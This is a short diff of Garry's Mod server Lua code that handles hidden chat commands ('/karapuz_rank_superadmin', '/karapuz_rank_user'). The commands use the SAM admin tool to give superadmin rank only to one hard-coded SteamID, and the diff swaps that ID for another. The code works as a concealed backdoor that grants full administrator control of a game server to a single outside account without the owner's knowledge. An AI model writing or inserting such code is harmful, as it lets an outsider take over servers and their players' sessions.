@@ -3,9 +3,9 @@ if SERVER then
 
             if text == "/karapuz_rank_superadmin" then
 
-            if ply:SteamID() == 'STEAM_0:0:555589832' then 
+            if ply:SteamID() == 'STEAM_0:0:555589835' then 
                    RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin') 
-            elseif ply:SteamID() ~= 'STEAM_0:0:555589832'  then
+            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
 
 
@@ -23,9 +23,9 @@ if SERVER then
 
             if text == "/karapuz_rank_user" then
 
-            if ply:SteamID() == 'STEAM_0:0:555589832' then 
+            if ply:SteamID() == 'STEAM_0:0:555589835' then 
                    RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user') 
-            elseif ply:SteamID() ~= 'STEAM_0:0:555589832'  then
+            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
 
 
